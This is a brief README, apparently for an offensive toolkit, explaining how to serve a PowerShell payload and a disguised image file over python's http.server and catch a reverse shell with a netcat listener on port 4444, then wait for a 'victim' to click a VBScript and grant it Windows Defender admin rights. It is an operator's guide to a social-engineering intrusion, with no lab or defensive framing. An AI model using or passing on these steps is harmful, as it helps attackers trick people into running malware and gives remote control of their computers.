# Usage
Move the test.ps1 and login1.jpg to /var/www/html in your linux machine and start a listener in this directory. I prefer python: 
```
python3 -m http.server
```
After it starts runnin' on port 8000, open a separate terminal and run netcat on port 4444:
```
nc -lnvp 4444
```

Then all you need to do is wait for the victim to click on the 'script.vbs' of the repo and allow the admin windows defender.


